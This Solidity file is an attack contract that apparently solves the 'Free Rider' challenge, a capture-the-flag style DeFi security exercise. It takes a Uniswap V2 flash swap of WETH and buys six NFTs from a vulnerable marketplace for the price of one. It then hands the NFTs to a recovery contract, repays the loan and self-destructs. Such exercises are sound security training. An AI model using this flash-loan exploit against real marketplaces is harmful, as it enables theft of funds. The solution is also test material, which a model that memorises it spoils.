// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderRecovery} from "./FreeRiderRecovery.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address to, uint256 value) external returns (bool);
}

contract FreeRiderAttack is IERC721Receiver {
    IUniswapV2Pair private immutable _UNISWAP_V2_PAIR;
    FreeRiderNFTMarketplace private immutable _FREE_RIDER_NFT_MARKETPLACE;
    FreeRiderRecovery private immutable _FREE_RIDER_RECOVERY;
    IWETH private immutable _WETH;

    error NotPair();

    constructor(address uniswapV2Pair, address freeRiderNFTMarketplace, address freeRiderRecovery, address weth) {
        _UNISWAP_V2_PAIR = IUniswapV2Pair(uniswapV2Pair);
        _FREE_RIDER_NFT_MARKETPLACE = FreeRiderNFTMarketplace(payable(freeRiderNFTMarketplace));
        _FREE_RIDER_RECOVERY = FreeRiderRecovery(freeRiderRecovery);
        _WETH = IWETH(weth);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) public {
        if (msg.sender != address(_UNISWAP_V2_PAIR)) revert NotPair();
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i; i < 6; i++) {
            tokenIds[i] = i;
        }
        _WETH.withdraw(15 ether);
        _FREE_RIDER_NFT_MARKETPLACE.buyMany{value: 15 ether}(tokenIds);
        for (uint256 i = 0; i < 6; i++) {
            _FREE_RIDER_NFT_MARKETPLACE.token().safeTransferFrom(
                address(this), address(_FREE_RIDER_RECOVERY), i, abi.encode(address(this))
            );
        }
        _WETH.deposit{value: 15 ether * uint256(1000) / 997 + 1}();
        _WETH.transfer(address(_UNISWAP_V2_PAIR), 15 ether * uint256(1000) / 997 + 1);
        selfdestruct(payable(tx.origin));
    }

    function attack() public {
        _UNISWAP_V2_PAIR.swap(15 ether, 0, address(this), "test");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
